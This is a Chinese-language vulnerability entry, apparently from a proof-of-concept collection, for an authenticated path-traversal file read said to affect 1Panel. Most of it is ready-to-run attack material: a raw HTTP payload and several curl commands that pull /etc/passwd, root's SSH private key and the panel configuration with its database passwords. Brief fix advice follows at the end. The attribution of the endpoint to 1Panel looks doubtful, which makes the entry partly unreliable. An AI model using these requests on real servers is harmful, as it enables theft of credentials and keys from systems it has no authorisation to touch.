---
id: 1PANEL-FILE-READ
title: "1Panel - 任意文件读取（路径遍历）"
product: 1panel
vendor: FIT2CLOUD
version_affected: "未明确"
severity: HIGH
tags: [file-read, path-traversal, 需要认证]
fingerprint: ["1Panel"]
---

## 漏洞描述

1Panel 的 `/systemController/showOrDownByurl.do` 端点的 `dbPath` 参数存在路径遍历漏洞，攻击者可利用 `../` 回溯到根目录，读取服务器上的任意文件，包括 `/etc/passwd`、SSH 私钥、1Panel 配置文件等敏感信息。该漏洞无 CVE 编号。

## 影响版本

- 未明确，存在 `/systemController/showOrDownByurl.do` 端点的版本

## 前置条件

- 大多数部署中需要后台认证（有效的 `psession` Cookie）
- 能够访问 1Panel 管理端口（默认 10086）

## 利用步骤

1. 登录 1Panel 面板获取有效 session cookie
2. 构造包含路径遍历的请求访问 `/systemController/showOrDownByurl.do`
3. 通过 `dbPath` 参数使用 `../../../../../` 回溯到根目录
4. 读取目标文件内容

## Payload

```http
GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../etc/passwd HTTP/1.1
Host: target
Cookie: psession=<session_cookie>
```

### 使用 curl 读取文件

```bash
# 读取 /etc/passwd
curl -sk -b cookie.txt \
  "https://target:10086/systemController/showOrDownByurl.do?down=&dbPath=../../../../../etc/passwd"

# 读取 SSH 私钥
curl -sk -b cookie.txt \
  "https://target:10086/systemController/showOrDownByurl.do?down=&dbPath=../../../../../root/.ssh/id_rsa"

# 读取 1Panel 配置文件（含数据库密码等敏感信息）
curl -sk -b cookie.txt \
  "https://target:10086/systemController/showOrDownByurl.do?down=&dbPath=../../../../../opt/1panel/conf/app.yaml"

# 下载模式（带 down 参数触发文件下载）
curl -sk -b cookie.txt -o passwd.txt \
  "https://target:10086/systemController/showOrDownByurl.do?down=1&dbPath=../../../../../etc/passwd"
```

## 验证方法

```bash
# 发送文件读取请求，检查返回内容是否为 /etc/passwd 内容
curl -sk -b cookie.txt \
  "https://target:10086/systemController/showOrDownByurl.do?down=&dbPath=../../../../../etc/passwd"
# 返回包含 root:x:0:0: 等内容即确认漏洞存在
```

### 注意事项

- 路径遍历使用 `../../../../../` 回溯到根目录
- `down=1` 参数触发下载模式，`down=` 为空则在线显示
- 可读取 `/etc/passwd`、SSH 密钥、配置文件等敏感信息

## 修复建议

1. 升级到最新版本
2. 对 `dbPath` 参数进行严格的路径规范化和白名单校验
3. 禁止路径中包含 `..` 的请求
4. 通过防火墙/IP 白名单限制面板访问
